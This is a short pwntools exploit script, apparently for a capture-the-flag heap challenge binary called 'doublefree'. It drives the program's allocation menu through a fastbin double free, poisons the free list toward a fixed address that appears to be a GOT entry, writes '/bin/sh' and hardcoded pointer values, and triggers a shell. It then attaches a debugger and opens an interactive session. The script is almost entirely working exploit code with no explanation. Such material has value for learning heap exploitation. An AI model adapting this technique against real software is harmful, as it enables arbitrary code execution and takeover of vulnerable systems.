from pwn import *
def cmd(x):
	p.recvuntil("> ");
	p.sendline(x);

def malloc(a,b,c):
	cmd("1\n%d %d\n%s"% (a,b,c))

def puts(a):
	cmd("3\n%d"%a);

def free(a):
	cmd("2\n%s"%a);

p=process("./doublefree")
malloc(0,55,p64(0xdeadbeef))
#raw_input("")
malloc(1,55,p64(0xdeadbeef))
free("0");
free("1");
free("0");
malloc(2,55,p64(0x601022))
malloc(3,55,"/bin/sh\0")
malloc(4,55,p64(0xdeadbeef))
malloc(5,55,p64(0x702000007ffff7a8)+p64(0x1ca000007ffff7b8)+p64(0x067600007ffff7aa)+p64(0x2c70000000000040))
sh=0x603060
cmd("1\n6 %d"%sh);
if True:
	gdb.attach(p,'''
	heapinfo
	''')

p.interactive();	
